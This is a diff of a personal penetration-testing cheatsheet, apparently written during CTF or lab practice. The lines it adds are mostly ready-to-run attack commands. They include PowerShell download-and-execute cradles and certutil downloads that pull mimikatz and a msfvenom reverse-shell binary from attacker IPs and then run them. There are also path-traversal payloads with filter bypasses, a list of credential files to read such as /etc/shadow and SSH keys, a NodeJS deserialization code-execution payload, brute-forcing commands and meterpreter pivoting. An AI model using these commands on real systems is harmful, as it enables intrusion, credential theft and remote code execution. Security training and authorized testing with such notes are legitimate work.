@@ -1,13 +1,27 @@
-# Cheatsheet Notes
+# Cheatsheet
 
 Use these notes in case of looking back on syntaxes or best way to run a tool or exploitation methods.
 > In no paticular order
+
+## Check Active Machines:
+arp -a
+arp-scan -l
+
+## Check Open Ports:
+ss -tulpn
+netstat -ano
+
+## Hidden Windows Folders/Files:
+gci -Hidden
 
 ## Nmap:
 nmap "IP"
 nmap -p- "IP"
 nmap -A -T4 -p "ports" -oN initial_scan "IP" -vvv
 sudo nmap -p- -sV -sC -sS -A -v --min-rate 1000 --max-retries 5 -oN fullportscan "IP"
+sudo nmap -p- -sV -sC -sS -A -vvvv -oN portscan.nmap "IP" -Pn
+nmap -sV -sC -A -vvvv -oN portscan.nmap "IP"
+nmap -p- -vvvv 10.129.181.131
 
 ## Nessus
 sudo service nessusd start
@@ -19,11 +33,17 @@ rustscan -a "IP" -r 1-65530 -u 5000 -- -A -sC
 ## Nikto:
 nikto --host "URL"
 
-## Check for ALive URLs
+## Check for Alive URLs
 cat subdomains.txt | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443' *Look for admin/stag/dev. They could be good*
 
 ## Send file to Windows (URLCACHE Method)
 certutil -urlcache -f http://10.17.4.195/mimikatz-32.exe mimikatz.exe
+
+## Send file to Windows (Powershell Method)
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.14.12.230/CLSID.ps1')"
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.14.12.230/CLSID.ps1')|iex"
+powershell -c (New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
+Invoke-WebRequest "http://10.14.12.230/CLSID.ps1" -OutFile "CLSID.ps1"
 
 ## Medusa (Bruteforce):
 medusa -h "IP" -u "username" -P "PASSWORD WORDLIST" -M "MODULE (EG; SMBNT)"
@@ -61,11 +81,17 @@ msfconsole:- "AUXILIARY/SCANNER/SMB/SMB_VERSION" *Use this to get SMB Version*
 smbclinet -L /"IP" *To list the shares*
 smbclient //"IP"/"SHARE" *To access the share*
 smbclient //"IP"/"SHARE" -U "username" *To provide a username*
-nmap --script smb-user-enum "IP" *To get usernames using nmap*
+nmap --script smb-enum-users "IP" *To get usernames using nmap*
+
+## Zone Transfer:
+dig axfr <> <>
 
 ## FTP:
-Try the command "cd ..." to change directory *New trick I learned*
+Try the command "cd ..." to change directory *Maybe one of the directory is hidden in ...*
 Always use the command "ls -lah" to check the files in FTP folder *Maybe one of them is hidden*
+
+## xfreerdp:
+xfreerdp /u:"USERNAME" /p:'PASSWORD' /v:"IP ADDRESS" +clipboard /dynamic-resolution
 
 ## FTP Server:
 sudo python3 -m pyftpdlib 21
@@ -80,8 +106,63 @@ wpscan --url "URL" -e u,ap,at,dbe --plugins-detection aggressive
 gobuster dir -u "URL" -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,bak *Directory Bruteforcing*
 gobuster dns -d "URL" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt *Subdomain Enumeration*
 
+## LFI Files to Look For:
+https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html
+
+> LINUX:
+https://github.com/D35m0nd142/LFISuite/blob/master/pathtotest.txt
+/etc/issue
+/etc/profile
+/proc/version
+/etc/passwd
+/etc/shadow
+/root/.bash_history
+/var/log/dmessage
+/var/mail/root
+/root/.ssh/id_rsa
+/var/log/apache2/access.log
+/proc/self/cmdline
+/proc/<NUMBERS FROM 1 - 1000 TO CHECK FOR 1000 PROCESSES>/cmdline
+config files
+/etc/apache2/sites-available/000-default.conf
+/etc/apache2/sites-available/<VHOST NAME>.conf
+
+> WINDOWS:
+C:\boot.ini
+https://hakluke.medium.com/sensitive-files-to-grab-in-windows-4b8f0a655f40
+https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
+https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt
+
+## Windows Reverse Shell:
+1- msfvenom -p windows/meterpreter/reverse_tcp lhost=10.9.252.17 lport=1234 -f exe > shell.exe
+2- certutil.exe -urlcache -split -f http://10.9.252.17/shell.exe shell.exe & shell.exe
+
 ## LFI FILTER BYPASS:
 /?page=php://Filter/convert.base64-encode/resource=config
+/index.php?file=../../../../../../../../etc/passwd
+/index.php?file=../../../../../../../../etc/passwd%00
+/index.php?file=../../../../../../../../etc/passwd/.
+/index.php?file=....//....//....//....//....//....//....//....//etc//passwd
+
+## SNMP (Port 161):
+snmpwalk -c public -v2c -On <IP>
+
+## Meterpreter
+load powershell = Loads Powershell into meterpreter session
+powershell_shell = Runs a powershell shell
+
+## Meterpreter Portfwd
+```bash
+run auroroute -s "IP RANGE/SUBNET"
+```
+```bash
+portfwd add -l <local port on the attacking machine (yours)> -p <victim port we want to access> -r <victim IP address>
+```
+
+## NodeJS Deserialization Attack
+```
+{"email":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ping -c 1 10.14.12.230',function(error, stdout, stderr) { console.log(stdout) });\n }()"}
+```
 
 ## Finding Possible LFI 
 ffuf -c -r -u 'http://10.0.0.12/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 0
@@ -103,6 +184,10 @@ python -c 'import os;os.system("/bin/bash")'
 
 ## Permissions
 find / -type f -perm -u=s 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+
+## Checking a PID's DLLs in Windows
+tasklist /m /fi "pid eq `PID`"
 
 ## Git Shit
 git log . = Check git logs from a .git/ folder
